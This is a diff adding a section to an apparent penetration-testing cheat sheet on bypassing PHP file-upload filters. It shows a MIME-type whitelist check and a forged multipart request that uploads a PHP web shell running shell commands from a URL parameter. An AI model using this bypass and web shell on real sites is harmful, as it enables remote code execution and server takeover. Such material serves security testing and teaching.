@@ -43,6 +43,24 @@ photo.php.png
 + Developers may blacklist `*.php` using case sensitive regex
 + This can be bypassed with `file.PhP`
 
+### PHP File-Type Bypass
+
++ Typical of image uploads, developers will try to whitelist the allowed file types that may be uploaded.
+```php
+if ((($_FILES["file"]["type"] == "image/gif") || 
+     ($_FILES["file"]["type"] == "image/jpeg")|| 
+     ($_FILES["file"]["type"] == "image/JPG") ||
+     ($_FILES["file"]["type"] == "image/png") || 
+     ($_FILES["file"]["type"] == "image/pjpeg"))
+```
+
++ This can be bypassed by changing the `Content-Type` in the POST request sent to the server
+```php
+Content-Disposition: form-data; name="file"; filename="magic.php"
+Content-Type: image/png
+
+<?php echo shell_exec($_GET["magic"]); ?>
+```
 
 
 ## External References 
